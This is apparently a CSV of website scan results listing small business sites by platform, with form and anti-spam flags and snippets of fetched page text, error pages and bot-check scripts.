1637,sabzfalaholive.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection timeout
1647,thestolenlamb.com,woocommerce,woocommerce,True,0,0,0,,True,False,Please leave this field empty.,none,False,,none,False,3,False,False,".hfe-skip-link{position:absolute;width:1px;height:1px;margin:-1px;padding:0;border:0;overflow:hidden;clip:rect(0,0,0,0);clip-path:inset(50%);white-space:nowrap;} .hfe-skip-link:focus{position:fixed;top:0;inset-inline-start:0;width:auto;height:auto;margin:0;padding:0.75em 1.5em;overflow:visible;clip:auto;clip-path:none;white-space:normal;z-index:100000;background:#fff;color:#0073aa;font-size:14px;text-decoration:underline;border-radius:0 0 3px 0;outline:2px solid #0073aa;outline-offset:-2px;} Skip to main content Stolen Lamb .elementor-12 .elementor-element.elementor-element-8fac6ee{--display:flex;--flex-direction:row;--container-widget-width:initial;--container-widget-height:100%;--container-widget-flex-grow:1;--container-widget-align-self:stretch;--flex-wrap-mobile:wrap;--margin-top:45px;--margin-bottom:45px;--margin-left:0px;--margin-right:0px;}.elementor-12 .elementor-element.elementor-element-7831a26{--display:flex;--padding-top:0px;--padding-bottom:0px;--padding-left:0px;--padding-right:0px;}.elementor-widget-site-logo .hfe-site-logo-container .hfe-site-logo-img{border-color:var( --e-global-color-primary );}.elementor-widget-site-logo .widget-image-caption{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-size:var( --e-global-typography-text-font-size );font-weight:var( --e-global-typography-text-font-weight );line-height:var( --e-global-typography-text-line-height );}.elementor-12 .elementor-element.elementor-element-c563e19 .hfe-site-logo-container, .elementor-12 .elementor-element.elementor-element-c563e19 .hfe-caption-width figcaption{text-align:left;}.elementor-12 .elementor-element.elementor-element-c563e19 .widget-image-caption{margin-top:0px;margin-bottom:0px;}.elementor-12 .elementor-element.elementor-element-c563e19 .hfe-site-logo-container .hfe-site-logo-img{border-style:none;}.elementor-12 .elementor-element.elementor-element-2f1d428{--display:flex;--padding-top:30px;--padding-bottom:0px;--padding-left:0px;--padding-right:0px;}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item.elementor-button{background-color:var( --e-global-color-accent );font-family:var( --e-global-typography-accent-font-family ), Sans-serif;font-weight:var( --e-global-typography-accent-font-weight );}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item.elementor-button:hover{background-color:var( --e-global-color-accent );}.elementor-widget-navigation-menu a.hfe-menu-item, .elementor-widget-navigation-menu a.hfe-sub-menu-item{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-size:var( --e-global-typography-primary-font-size );font-weight:var( --e-global-typography-primary-font-weight );text-transform:var( --e-global-typography-primary-text-transform );line-height:var( --e-global-typography-primary-line-height );letter-spacing:var( --e-global-typography-primary-letter-spacing );}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item, .elementor-widget-navigation-menu .sub-menu a.hfe-sub-menu-item{color:var( --e-global-color-text );}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item:hover, .elementor-widget-navigation-menu .sub-menu a.hfe-sub-menu-item:hover, .elementor-widget-navigation-menu .menu-item.current-menu-item a.hfe-menu-item, .elementor-widget-navigation-menu .menu-item a.hfe-menu-item.highlighted, .elementor-widget-navigation-menu .menu-item a.hfe-menu-item:focus{color:var( --e-global-color-accent );}.elementor-widget-navigation-menu .hfe-nav-menu-layout:not(.hfe-pointer__framed) .menu-item.parent a.hfe-menu-item:before, .elementor-widget-navigation-menu .hfe-nav-menu-layout:not(.hfe-pointer__framed) .menu-item.parent a.hfe-menu-item:after{background-color:var( --e-global-color-accent );}.elementor-widget-navigation-menu .hfe-nav-menu-layout:not(.hfe-pointer__framed) .menu-item.parent .sub-menu .hfe-has-submenu-container a:after{background-color:var( --e-global-color-accent );}.elementor-widget-navigation-menu .hfe-pointer__framed .menu-item.parent a.hfe-menu-item:before, .elementor-widget-navigation-menu .hfe-pointer__framed .menu-item.parent a.hfe-menu-item:after{border-color:var( --e-global-color-accent );} .elementor-widget-navigation-menu .sub-menu li a.hfe-sub-menu-item, .elementor-widget-navigation-menu nav.hfe-dropdown li a.hfe-sub-menu-item, .elementor-widget-navigation-menu nav.hfe-dropdown li a.hfe-menu-item, .elementor-widget-navigation-menu nav.hfe-dropdown-expandible li a.hfe-menu-item, .elementor-widget-navigation-menu nav.hfe-dropdown-expandible li a.hfe-sub-menu-item{font-family:var( --e-global-typography-accent-font-family ), Sans-serif;font-weight:var( --e-global-typography-accent-font-weight );}.elementor-12 .elementor-element.elementor-element-e07c766 .menu-item a.hfe-menu-item{padding-left:0px;padding-right:0px;}.elementor-12 .elementor-element.elementor-element-e07c766 .menu-item a.hfe-sub-menu-item{padding-left:calc( 0px + 20px );padding-right:0px;}.elementor-12 .elementor-element.elementor-element-e07c766 .hfe-nav-menu__layout-vertical .menu-item ul ul a.hfe-sub-menu-item{padding-left:calc( 0px + 40px );padding-right:0px;}.elementor-12 .elementor-element.elementor-element-e07c766 .hfe-nav-menu__layout-vertical .menu-item ul ul ul a.hfe-sub-menu-item{padding-left:calc( 0px + 60px );padding-right:0px;}.elementor-12 .elementor-element.elementor-element-e07c766 .hfe-nav-menu__layout-vertical .menu-item ul ul ul ul a.hfe-sub-menu-item{padding-left:calc( 0px + 80px );padding-right:0px;}.elementor-12 .elementor-element.elementor-element-e07c766 .menu-item a.hfe-menu-item, .elementor-12 .elementor-element.elementor-element-e07c766 .menu-item a.hfe-sub-menu-item{padding-top:8px;padding-bottom:8px;}body:not(.rtl) .elementor-12 .elementor-element.elementor-element-e07c766 .hfe-nav-menu__layout-horizontal .hfe-nav-menu > li.menu-item:not(:last-child){margin-right:74px;}body.rtl .elementor-12 .elementor-element.elementor-element-e07c766 .hfe-nav-menu__layout"
1659,tapsplastics.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1681,bharattanning.com,woocommerce,woocommerce,True,4,0,0,,True,True,GET QUOTATION NOW,none,False,,none,False,1,False,False,"Home Products Finished Leather Leather Safety Shoes Industrial Coverall Piril International About Us Contact Us WE BELIEVE THE BEST IDEAS EMERGE FROM THE SIMPLEST TOOLS Bharat Tanning Industries is also working as Safia International. DISCOVERING BTI Materials From the texture, to the weight, to the way it makes you feel, it’s all long-lasting leather. Tools We’re obsessed with leather. Well-made and long-lasting. Everything is better in leather. Custom design Handcrafted Leather, Distinctive Details, Classic and On-trend Leather Designs. Let's connect Always in fashion, classic leather ages well and gains character, as you do. PRODUCT CATEGORIES Safety Shoes Industrial Coverall Finished Leather PRODUCT GALLERY It takes at least 5 years to fully train a new BTI craftsperson to make leather goods with our degree of sophistication. Safety Shoe 1143 Read more Cherry Tumble Effect Belt Read more Boot 6210 Read more Pony Read more Boot 1195 Read more Nubuck Read more We work hard. We deliver. THERE IS A STORY BEHIND EVERY PIECE VIEW MORE Perfect fit We put a modern take on classic pieces. VIEW MORE Full manufacture Inspiration drawn from vintage designs. VIEW MORE Let's connect Taking seamless key performance from our history. VIEW MORE 0 1 2 3 4 5 6 7 8 9 0 0 1 2 3 4 5 6 7 8 9 0 0 1 2 3 4 5 6 7 8 9 0 % GENUINE LEATHER 0 1 2 3 4 5 6 7 8 9 0 0 1 2 3 4 5 6 7 8 9 0 / 0 1 2 3 4 5 6 7 8 9 0 0 1 2 3 4 5 6 7 8 9 0 QUALITY ASSURANCE 0 1 2 3 4 5 6 7 8 9 0 0 1 2 3 4 5 6 7 8 9 0 + PRESENCE IN COUNTRIES 0 1 2 3 4 5 6 7 8 9 0 0 1 2 3 4 5 6 7 8 9 0 + YEARS IN BUSINESS GET QUOTATION NOW Parvez Ahmad Ansari Muhammad Habib Ansari marketing@bharattanning.com tiger624@gmail.com bti@sancharnet.in habibansari00@gmail.com +91 9839067778 +91 9838811471 150, Feet Road, Wajidpur, Jajmau, Kanpur-208010. Uttar Pradesh, India. © Copyright 2026. All Rights Reserved to Bharat Tanning Industries . Website Designed by Hamza (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); document.body.className = c; })(); ( 'fetch' in window ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0""></scr' + 'ipt>' );( document.contains ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0""></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0""></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4""></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12""></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2""></scr' + 'ipt>' );( 'objectFit' in document.documentElement.style ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-object-fit.min.js?ver=2.3.4""></scr' + 'ipt>' ); /* <![CDATA[ */ var wpcf7 = {""api"":{""root"":""http:\/\/bharattanning.com\/wp-json\/"",""namespace"":""contact-form-7\/v1""}}; /* ]]> */ /* <![CDATA[ */ var wc_add_to_cart_params = {""ajax_url"":""\/wp-admin\/admin-ajax.php"",""wc_ajax_url"":""\/?wc-ajax=%%endpoint%%"",""i18n_view_cart"":""View cart"",""cart_url"":""http:\/\/bharattanning.com"",""is_cart"":"""",""cart_redirect_after_add"":""no""}; /* ]]> */ /* <![CDATA[ */ var woocommerce_params = {""ajax_url"":""\/wp-admin\/admin-ajax.php"",""wc_ajax_url"":""\/?wc-ajax=%%endpoint%%""}; /* ]]> */ /* <![CDATA[ */ var wc_cart_fragments_params = {""ajax_url"":""\/wp-admin\/admin-ajax.php"",""wc_ajax_url"":""\/?wc-ajax=%%endpoint%%"",""cart_hash_key"":""wc_cart_hash_05f0a738cee946658d7f20fedc912f51"",""fragment_name"":""wc_fragments_05f0a738cee946658d7f20fedc912f51"",""request_timeout"":""5000""}; /* ]]> */ window.BoldThemesURI = ""http://bharattanning.com/wp-content/themes/manufactura""; window.BoldThemesAJAXURL = ""http://bharattanning.com/wp-admin/admin-ajax.php"";window.boldthemes_text = [];window.boldthemes_text.previous = 'previous';window.boldthemes_text.next = 'next'; var boldthemes_dropdown = document.querySelector( "".widget_categories #cat"" ); function boldthemes_onCatChange() { if ( boldthemes_dropdown.options[boldthemes_dropdown.selectedIndex].value > 0 ) { location.href = ""http://bharattanning.com/?cat=""+boldthemes_dropdown.options[boldthemes_dropdown.selectedIndex].value; } } if ( boldthemes_dropdown !== null ) { boldthemes_dropdown.onchange = boldthemes_onCatChange; } Home Products Finished Leather Leather Safety Shoes Industrial Coverall Piril International About Us Contact Us PRODUCTS Finished Leather Zug grain Waxy Pull up Tango Belt Crust More Finishes Leather Belts Black Pinhole Effect Belt Oxford Blue Topdown Effect Belt Cherry Tumble Effect Belt More Finishes Leather Shoes Foundry Boot Safety Boots 6210 Safety Shoe 1143 Boots 6000 More Designs Industrial Coverall Industrial Safety Coverall Orange Industrial Safety Coverall Blue Industrial Safety Coverall Purple More Colors Parvez Ahmad Ansari Muhammad Habib Ansari marketing@bharattanning.com tiger624@gmail.com bti@sancharnet.in habibansari00@gmail.com +91 9839067778 +91 9838811471 150, Feet Road, Wajidpur, Jajmau, Kanpur-208010. Uttar Pradesh, India. © Copyright 2026. All Rights Reserved to Bharat Tanning Industries . Website Designed by Hamza (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); document.body.className = c; })(); ( 'fetch' in window ) || document.write( '<script src=""http://bharattanning.com/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0""></scr' + 'ipt>' );( documen"
1683,mini-rc-combat.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection timeout
1692,lythubtechnologies.com,wordpress,wp-includes,False,0,0,0,,False,False,,none,False,,none,False,1,False,False,"Lyt Hub technologies Home About Us Services Projects Our Team FAQs Get In Touch WordPress › Error html { background: #f1f1f1; } body { background: #fff; border: 1px solid #ccd0d4; color: #444; font-family: -apple-system, BlinkMacSystemFont, ""Segoe UI"", Roboto, Oxygen-Sans, Ubuntu, Cantarell, ""Helvetica Neue"", sans-serif; margin: 2em auto; padding: 1em 2em; max-width: 700px; -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .04); box-shadow: 0 1px 1px rgba(0, 0, 0, .04); } h1 { border-bottom: 1px solid #dadada; clear: both; color: #666; font-size: 24px; margin: 30px 0 0 0; padding: 0; padding-bottom: 7px; } #error-page { margin-top: 50px; } #error-page p, #error-page .wp-die-message { font-size: 14px; line-height: 1.5; margin: 25px 0 20px; } #error-page code { font-family: Consolas, Monaco, monospace; } ul li { margin-bottom: 10px; font-size: 14px ; } a { color: #3858e9; } a:hover, a:active { color: #183ad6; } a:focus { color: #183ad6; box-shadow: 0 0 0 var(--wp-admin-border-width-focus, 1.5px) var(--wp-admin-theme-color, #3858e9); outline: 2px solid transparent; } .button { background: #f3f5f6; border: 1px solid #016087; color: #016087; display: inline-block; text-decoration: none; font-size: 13px; line-height: 2; height: 28px; margin: 0; padding: 0 10px 1px; cursor: pointer; -webkit-border-radius: 3px; -webkit-appearance: none; border-radius: 3px; white-space: nowrap; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; vertical-align: top; } .button.button-large { line-height: 2.30769231; min-height: 32px; padding: 0 12px; } .button:hover, .button:focus { background: #f1f1f1; } .button:focus { background: #f3f5f6; border-color: #007cba; -webkit-box-shadow: 0 0 0 1px #007cba; box-shadow: 0 0 0 1px #007cba; color: #016087; outline: 2px solid transparent; outline-offset: 0; } .button:active { background: #f3f5f6; border-color: #7e8993; -webkit-box-shadow: none; box-shadow: none; } There has been a critical error on this website. Learn more about troubleshooting WordPress."
1696,pianetabbq.it,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1699,carolinapurewater.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"403 Forbidden nginx (function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML=""window.__CF$cv$params={r:'a325657e188683b9',t:'MTc4Nzk0MTkyMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);"";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();"
1705,artematech.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Please enable cookies. Sorry, you have been blocked You are unable to access artematech.com Why have I been blocked? This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data. What can I do to resolve this? You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page. Cloudflare Ray ID: a325660eec2ba465 • Your IP: Click to reveal 34.170.141.253 • Performance & security by Cloudflare (function(){function d(){var b=a.getElementById(""cf-footer-item-ip""),c=a.getElementById(""cf-footer-ip-reveal"");b&&""classList""in b&&(b.classList.remove(""hidden""),c.addEventListener(""click"",function(){c.classList.add(""hidden"");a.getElementById(""cf-footer-ip"").classList.remove(""hidden"")}))}var a=document;document.addEventListener&&a.addEventListener(""DOMContentLoaded"",d)})(); window._cf_translation = {};"
574,sitnpaws.co.uk,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
608,woozod.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,403 Forbidden Access to this resource on the server is denied!
664,golusrasoi.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Checking your browser before accessing Please wait for up to 5 seconds... Please check that your browser supports JavaScript and that it is enabled in the browser settings. document.getElementById('domain-name').textContent=window.location.hostname; function g(a,b){var c=f();return g=function(d,e){d=d-0xcb;var h=c[d];return h;},g(a,b);}(function(h,i){function Z(h,i){return g(i- -0x277,h);}var j=h();while(!![]){try{var k=-parseInt(Z(-0x1a2,-0x198))/0x1+-parseInt(Z(-0x179,-0x189))/0x2+parseInt(Z(-0x1b7,-0x1ab))/0x3*(-parseInt(Z(-0x1a6,-0x1a0))/0x4)+-parseInt(Z(-0x196,-0x18c))/0x5+-parseInt(Z(-0x1ad,-0x19f))/0x6*(parseInt(Z(-0x192,-0x192))/0x7)+-parseInt(Z(-0x19c,-0x193))/0x8*(-parseInt(Z(-0x194,-0x18f))/0x9)+parseInt(Z(-0x1ab,-0x1a2))/0xa;if(k===i)break;else j['push'](j['shift']());}catch(l){j['push'](j['shift']());}}}(f,0xbaf6b));function f(){var a7=['123MCptJC','location','exception','table','charCodeAt','status','slice','bind','length','29205400suMunD','prototype','19172rzlRUt','711384kZsqYM','console','concat','trace','{}.constructor(\x22return\x20this\x22)(\x20)','Content-Type','warn','1184299iAoMQM','send','info','apply','application/x-www-form-urlencoded','6689656NjkqqV','28DGQdGS','search','toString','9RrPAbC','(((.+)+)+)+$','__proto__','5286955HVQQfG','error','onload','156970CygjlA','constructor','POST','setRequestHeader'];f=function(){return a7;};return f();}var e=(function(){var h=!![];return function(i,j){var k=h?function(){function a0(h,i){return g(h- -0x2c9,i);}if(j){var l=j[a0(-0x1e7,-0x1ec)](i,arguments);return j=null,l;}}:function(){};return h=![],k;};}()),d=e(this,function(){function a1(h,i){return g(i-0x8b,h);}return d['toString']()['search'](a1(0x16c,0x174))[a1(0x15f,0x172)]()['constructor'](d)[a1(0x177,0x171)]('(((.+)+)+)+$');});d();var c=(function(){var h=!![];return function(i,j){var k=h?function(){function a2(h,i){return g(i-0x3af,h);}if(j){var l=j[a2(0x47f,0x491)](i,arguments);return j=null,l;}}:function(){};return h=![],k;};}()),b=c(this,function(){var h;function a3(h,i){return g(h- -0xb,i);}try{var i=Function('return\x20(function()\x20'+a3(0xd1,0xca)+');');h=i();}catch(p){h=window;}var j=h[a3(0xce,0xd1)]=h['console']||{},k=['log',a3(0xd3,0xd9),a3(0xd6,0xd2),a3(0xe1,0xd5),a3(0xc3,0xb4),a3(0xc4,0xc8),a3(0xd0,0xd9)];for(var l=0x0;l<k[a3(0xc9,0xc7)];l++){var m=c[a3(0xe4,0xee)][a3(0xcb,0xd1)][a3(0xc8,0xbf)](c),n=k[l],o=j[n]||m;m[a3(0xdf,0xd8)]=c[a3(0xc8,0xba)](c),m[a3(0xdc,0xca)]=o['toString'][a3(0xc8,0xc2)](o),j[n]=m;}});b();var bbc6cf0=function a(z){function A(X,Y){return X>>>Y|X<<0x20-Y;}for(var B,C,D=Math['pow'],E=D(0x2,0x20),F='length',G='',H=[],I=0x8*z[F],J=a['h']=a['h']||[],K=a['k']=a['k']||[],L=K[F],M={},N=0x2;0x40>L;N++)if(!M[N]){for(B=0x0;0x139>B;B+=N)M[B]=N;J[L]=D(N,0.5)*E|0x0,K[L++]=D(N,0x1/0x3)*E|0x0;}for(z+='\u0080';z[F]%0x40-0x38;)z+='\x00';function a4(h,i){return g(h- -0x1a4,i);}for(B=0x0;B<z[F];B++){if(C=z[a4(-0xd4,-0xc5)](B),C>>0x8)return;H[B>>0x2]|=C<<(0x3-B)%0x4*0x8;}for(H[H[F]]=I/E|0x0,H[H[F]]=I,C=0x0;C<H[F];){var O=H[a4(-0xd2,-0xd6)](C,C+=0x10),P=J;for(J=J[a4(-0xd2,-0xdd)](0x0,0x8),B=0x0;0x40>B;B++){var Q=O[B-0xf],R=O[B-0x2],S=J[0x0],T=J[0x4],U=J[0x7]+(A(T,0x6)^A(T,0xb)^A(T,0x19))+(T&J[0x5]^~T&J[0x6])+K[B]+(O[B]=0x10>B?O[B]:O[B-0x10]+(A(Q,0x7)^A(Q,0x12)^Q>>>0x3)+O[B-0x7]+(A(R,0x11)^A(R,0x13)^R>>>0xa)|0x0),V=(A(S,0x2)^A(S,0xd)^A(S,0x16))+(S&J[0x1]^S&J[0x2]^J[0x1]&J[0x2]);J=[U+V|0x0][a4(-0xca,-0xcd)](J),J[0x4]=J[0x4]+U|0x0;}for(B=0x0;0x8>B;B++)J[B]=J[B]+P[B]|0x0;}for(B=0x0;0x8>B;B++)for(C=0x3;C+0x1;C--){var W=J[B]>>0x8*C&0xff;G+=(0x10>W?0x0:'')+W['toString'](0x10);}return G;};async function f28b4e5d(h){return new Promise(i=>setTimeout(i,h));}((async()=>{await f28b4e5d(0xbb8);function a5(h,i){return g(i- -0x18d,h);}const h=await bbc6cf0(cjs);xhr=new XMLHttpRequest(),xhr['open'](a5(-0x8c,-0x9d),jsChallengeUrl),xhr[a5(-0xb8,-0xc2)](a5(-0xb5,-0xb0),a5(-0x9f,-0xaa)),xhr[a5(-0x9e,-0xa0)]=function(){function a6(h,i){return a5(h,i-0x50b);}xhr[a6(0x459,0x44f)]===0xc8&&window[a6(0x447,0x44b)]['replace'](uri);},xhr[a5(-0xb5,-0xad)](encodeURI('challenge='+h));})());"
670,mariosjewellers.co.za,woocommerce,woocommerce,True,46,16,0,,True,False,Anti-spam,none,True,generic,none,False,1,True,True,"gtag(""event"", ""page_view"", {send_to: ""GLA""}); Home Jewellery Bracelets Chains Earrings Necklaces Pendants Rings Collections Engagement Rings Wedding Bands Timepieces Ladies Men’s Unisex Brands LONGINES RADO MONTBLANC FREDERIQUE CONSTANT HAMILTON TISSOT CASIO NOMINATION Consultations About Us Sign in Sign up Forgot password? Don't have an account? Sign up Anti-spam Your personal data will be used to support your experience throughout this website, to manage access to your account, and for other purposes described in our privacy policy . Already has an account? Sign in 0 Your Cart 0 Your cart is currently empty. Shop all products 0 Your Cart 0 Your cart is currently empty. Shop all products Home Jewellery Bracelets Chains Earrings Necklaces Pendants Rings Collections Engagement Rings Wedding Bands Timepieces Ladies Men’s Unisex Brands LONGINES RADO MONTBLANC FREDERIQUE CONSTANT HAMILTON TISSOT CASIO NOMINATION Consultations About Us Shop Search Login / Register Sign in Sign up Forgot password? Don't have an account? Sign up Anti-spam Your personal data will be used to support your experience throughout this website, to manage access to your account, and for other purposes described in our privacy policy . Already has an account? Sign in 10 Wishlist Shop Home Home / Home LONGINES HYDROCONQUEST See all Glow with Confidence You can tell a lot of care went into the design and materials. SHOP NOW window.SR7 ??={};SR7.PMH ??={}; SR7.PMH[""SR7_4_1""] = {cn:100,state:false,fn: function() { if (window._tpt!==undefined && window._tpt.prepareModuleHeight !== undefined) { _tpt.prepareModuleHeight({id:""SR7_4_1"",el:[1087,1087,750,650,600],type:'standard',shdw:'0',gh:[1087,1087,800,650,600],gw:[1929,1929,1024,778,480],vpt:['-100px&#039;,&#039;-100px&#039;,&#039;-100px&#039;,&#039;-100px&#039;,&#039;-100px'],size:{fullWidth:true, fullHeight:false},mh:'0',onh:0,onw:0,bg:{color:'{""orig"":""transparent"",""type"":""solid"",""string"":""transparent""}'}}); SR7.PMH[""SR7_4_1""].state=true;} else if(SR7.PMH[""SR7_4_1""].cn-->0) setTimeout( SR7.PMH[""SR7_4_1""].fn,19);}};SR7.PMH[""SR7_4_1"" ].fn(); SHOP BY CATEGORY Bracelets Chains Earrings Necklaces Pendants Rings TRENDING PRODUCTS Bracelets Chains Earrings Necklaces Pendants Rings rating Add to cart Add to wishlist Quick View Add to wishlist Quick View 9K Yellow Gold Panther Link Bracelet 20cm Bracelets R 110,500.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View 9K Yellow Gold White Clover Stone Bracelet 19cm Bracelets R 11,500.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View 9K Yellow Gold Multicolour Clover Stone Bracelet Bracelets R 28,500.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View 9K Yellow Gold Pavé Diamond Heart Station Bracelet 18cm Bracelets R 39,995.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View An 18K White Gold Fancy Link Bracelet Bracelets R 175,500.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View A 9K Yellow Gold Half Round Solid Bangle Bracelets R 95,000.00 Read more Add to wishlist Sold Out Quick View Add to wishlist Quick View A 9K Yellow Gold Half Round Solid Bangle Bracelets R 48,800.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View A 9K Yellow Gold Belcher Bracelet Bracelets R 99,500.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View 9K White Gold Diamond by the Yard Bracelet Bracelets R 55,000.00 Add to cart Add to wishlist Quick View Add to wishlist Quick View 18K Yellow Gold Multi-Strand Popcorn Link Bracelet Bracelets R 199,950.00 Nomination jewellery and composable links are the perfect way to express your love! Genuine Italian craftmanship and design is translated into every piece! Shop now NOMINATION Add to cart Quick View Add to wishlist Add to wishlist Quick View NOMINATION CLASSIC COMPOSABLE BASE BRACELET BLUE IP - 14 LINKS Base Bracelets R 725.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View NOMINATION CLASSIC COMPOSABLE BASE BRACELET BLACK IP - 14 LINKS Base Bracelets R 725.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View NOMINATION CLASSIC COMPOSABLE BASE BRACELET ROSE GOLD IP - 14 LINKS Base Bracelets R 725.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View NOMINATION CLASSIC COMPOSABLE BASE BRACELET GOLD IP - 14 LINKS Base Bracelets R 725.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View NOMINATION CLASSIC COMPOSABLE BASE BRACELET STEEL - 15 LINKS Base Bracelets R 582.00 Read more Quick View Sold Out Add to wishlist Add to wishlist Quick View NOMINATION CLASSIC LINK LILAC FLOWER IN 9K Rose Gold Links & Charms R 1,199.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View NOMINATION CLASSIC LINK BUTTERFLY, COLOURED ENAMEL IN 9K Rose Gold Links & Charms R 899.00 LONGINES Shop now RADO Shop now FREDERIQUE CONSTANT Shop now HAMILTON Shop now TISSOT Shop now CASIO Shop now TIMEPIECES Add to cart Quick View Browse wishlist Browse wishlist Quick View Frederique Constant Classics Index Small Seconds Automatic Classics R 29,995.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View Frederique Constant Classics Index Small Seconds Automatic Classics R 29,995.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View Frederique Constant Classics Heart Beat Moonphase Date Classics R 49,995.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View Frederique Constant Classics Vintage Rally Healey Chronograph Automatic Classics R 74,995.00 Read more Quick View Sold Out Add to wishlist Add to wishlist Quick View Frederique Constant Classics Carrée Automatic Classics R 34,995.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View Frederique Constant Classics Index Automatic Classics R 27,495.00 Add to cart Quick View Add to wishlist Add to wishlist Quick View Frederique Constant Classics Carrée Automatic Classics R 24,995.00 Each piece is thoughtfully crafted to reveal beauty in its m"
754,valordoor.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
763,drivematecarrentals.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
774,hemp-angels.hu,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
794,ayoshin.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection timeout
798,himkan.com,woocommerce,woocommerce,True,6,0,0,,True,False,,none,True,generic,tawk,False,7,True,False,"Skip to content Login Register 0 Home About Us Why Choose Himkan Sustainability Products Banta Jeera Energy Drink Sparkle Soda Mineral Water Springs Springs Contact Us Shop 0 Home About Us Why Choose Himkan Sustainability Products Banta Jeera Energy Drink Sparkle Soda Mineral Water Springs Springs Contact Us Shop 0 Login Register Pure as Snow, Refreshing as the Himalayas! Shop Now! HimKan Story In Himachal Pradesh, A place where the air is pure and the rivers flow with crystalline clarity from the snow capped mountains, hidden deep somewhere In the mist-kissed valleys, lies the secret of HimKan Mineral Water. Nestled amidst the majestic Shivaliks, the artisans of HimKan craft perfection in every bottle. With meticulous care, they harness the essence of nature, filtering it through layers of ancient rock and earth to create nothing but the purest. With a dash of added minerals it becomes elixir. Each bottle, a masterpiece of craftsmanship and purity, reflects the pristine beauty of its origin. As whispers of its unparalleled quality spread across the land, HimKan emerges as the epitome of excellence, the crown jewel of Himachal Pradesh’s mineral water. Key Features Pure Source Rich in Minerals Natural Hydration Supports Digestive Health Naturally Alkaline Promotes Healthy Skin Boosts Energy Levels Sustainable Sourcing Boosts Immunity HimKan Mineral Water Contains : Magnesium A macro mineral that helps with digestion by reducing bad bacteria in the gut, also helps the heart maintain a healthy rhythm and is involved in the regulation of blood pressure and cholestrol production, magnesium also in crucial in maintaining healthy bone density. Potassium A vasodilator tha can help reduce blood pressure and improve nervous system function and keeps muscles healthy. Calcium Apart from the most common and well known fact of calcium aiding towards the development and strengthening of your bones it also is an electrolyte and mineral that can help the body retain and absorb water, which can improve hydration. Iron It makes hemoglobin, which is a protein in red blood cells that carries oxygen from the lungs to all parts of the body. Refresh Your Spirit with Every Sip. Himkan We believe that hydration should be as pure as nature intended. Our 